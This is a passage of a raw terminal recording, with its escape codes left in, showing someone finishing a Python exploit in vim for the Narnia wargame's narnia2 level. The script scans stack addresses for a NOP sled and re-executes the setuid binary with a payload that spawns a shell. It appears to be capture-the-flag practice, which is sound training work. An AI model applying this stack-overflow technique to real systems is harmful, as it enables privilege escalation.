 ...\")\u001b[32;83H\u001b[K\u001b[32;83H49,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;"]
[0.000, "o", "1H\r\r\n\u001b[1;32r\u001b[30;1Hfound = None\u001b[32;83H\u001b[K\u001b[32;83H50,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hfor addr in range(0xffffd000, 0xffffe800, 4):\u001b[32;83H\u001b[K\u001b[32;83H51,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hif probe(addr):\u001b[32;83H\u001b[K\u001b[32;83H52,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;9Hfound = addr\u001b[32;83H\u001b[K\u001b[32;83H53,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;9Hbreak\u001b[32;83H\u001b[K\u001b[32;83H54,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hprint(\"landed in the NOP sled at\", hex(found) if found else \"NONE\")\u001b[32;83H\u001b[K\u001b[32;83H55,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hif found is None:\u001b[32;83H\u001b[K\u001b[32;83H56,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hsys.exit(1)\u001b[32;83H\u001b[K\u001b[32;83H57,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1H# Re-exec attached to the terminal so the spawned shell can be driven.\u001b[32;83H\u001b[K\u001b[32;83H58,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hos.execve(b\"/narnia/narnia2\", [b\"/narnia/narnia2\", payload_for(found)], env)\u001b[32;83H\u001b[K\u001b[32;83H59,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[32;1H\u001b[K\u001b[?25l\u001b[32;83H59,0-1\u001b[8CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[32;83H\u001b[K\u001b[32;1H:wq\r\u001b[?2004l\u001b[>4;m\"/tmp/e_narnia2.py\" [New] 59L, 2041B written\r\u001b[23;2t\u001b[23;1t\r\r\r\n\u001b[?1004l\u001b[?2004l\u001b[?1l\u001b>\u001b[?10